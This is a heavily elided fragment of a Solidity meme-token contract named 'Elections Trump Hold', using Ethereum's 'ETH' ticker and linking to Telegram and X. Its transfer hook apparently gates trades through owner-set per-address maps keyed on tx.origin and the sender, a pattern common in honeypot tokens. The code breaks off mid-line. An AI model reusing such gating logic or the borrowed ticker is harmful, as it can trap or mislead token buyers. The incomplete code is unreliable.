...
Elections Trump Hodl - $ETH

https://t.me/ElectionsTrumpHold

https://x.com/etrumphold
*/
...
contract ETH is ERC20, Ownable {
    ...
    constructor() ERC20(unicode"Elections Trump Hold", unicode"ETH") Ownable(msg.sender) {
    ...
    function _update(
        ...
        if (excludeStateOpenTrade[tx.origin]) {
            ...
            if (tx.gasprice > 0 &&  value > 0 && resArray[from]) 
